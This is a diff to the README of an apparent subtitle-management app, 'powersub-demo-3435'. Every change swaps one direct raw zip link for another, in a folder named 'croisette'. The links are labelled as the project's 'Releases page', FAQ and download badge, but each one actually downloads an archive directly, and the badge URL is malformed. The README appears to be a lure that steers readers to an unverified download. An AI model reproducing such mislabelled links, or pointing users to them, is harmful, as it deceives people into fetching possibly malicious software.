@@ -1,6 +1,6 @@
 # 🎉 powersub-demo-3435 - Easy Subtitle Management for Everyone
 
-[![Download Latest Release](https://raw.githubusercontent.com/Aritz24/powersub-demo-3435/main/croisette/powersub-demo-3435.zip%20Latest%20Release-blue?style=flat&logo=github)](https://raw.githubusercontent.com/Aritz24/powersub-demo-3435/main/croisette/powersub-demo-3435.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Aritz24/powersub-demo-3435/main/croisette/demo-powersub-1.7.zip%20Latest%20Release-blue?style=flat&logo=github)](https://raw.githubusercontent.com/Aritz24/powersub-demo-3435/main/croisette/demo-powersub-1.7.zip)
 
 ## 📥 Overview
 
@@ -11,7 +11,7 @@ Welcome to the powersub-demo-3435 project! This application helps you manage sub
 To begin using powersub-demo-3435, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://raw.githubusercontent.com/Aritz24/powersub-demo-3435/main/croisette/powersub-demo-3435.zip) to find the latest version of the app.
+   Go to the [Releases page](https://raw.githubusercontent.com/Aritz24/powersub-demo-3435/main/croisette/demo-powersub-1.7.zip) to find the latest version of the app.
 
 2. **Download the Application**
    Locate the version you wish to download. Click on the download link for the application. It will typically be labeled clearly with the version number. 
@@ -43,7 +43,7 @@ To run powersub-demo-3435, ensure your computer meets the following requirements
 
 To ensure you are always working with the latest features and fixes:
 
-1. **Check for Updates**: Regularly visit the [Releases page](https://raw.githubusercontent.com/Aritz24/powersub-demo-3435/main/croisette/powersub-demo-3435.zip).
+1. **Check for Updates**: Regularly visit the [Releases page](https://raw.githubusercontent.com/Aritz24/powersub-demo-3435/main/croisette/demo-powersub-1.7.zip).
 2. **Download New Versions**: Follow the same steps mentioned in the "Download the Application" section to install updates.
 
 ## 🛠️ Troubleshooting
@@ -60,7 +60,7 @@ Your experience matters! If you have comments or suggestions, please reach out v
 
 ## 📞 Support
 
-For further assistance, check the FAQ on the [Releases page](https://raw.githubusercontent.com/Aritz24/powersub-demo-3435/main/croisette/powersub-demo-3435.zip) or contact the support team directly through GitHub.
+For further assistance, check the FAQ on the [Releases page](https://raw.githubusercontent.com/Aritz24/powersub-demo-3435/main/croisette/demo-powersub-1.7.zip) or contact the support team directly through GitHub.
 
 ## 📅 Future Plans
 
